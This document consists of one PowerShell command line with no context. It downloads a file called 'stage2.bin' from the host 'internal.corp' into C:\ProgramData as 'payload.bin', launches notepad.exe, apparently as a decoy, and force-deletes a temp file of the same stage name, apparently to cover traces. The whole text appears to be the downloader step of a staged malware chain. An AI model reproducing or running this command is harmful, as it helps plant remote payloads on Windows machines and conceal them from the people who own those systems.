
Invoke-WebRequest -Uri "https://internal.corp:443/stage2.bin" -OutFile "C:\ProgramData\payload.bin" -UseBasicParsing; Start-Process -FilePath "notepad.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
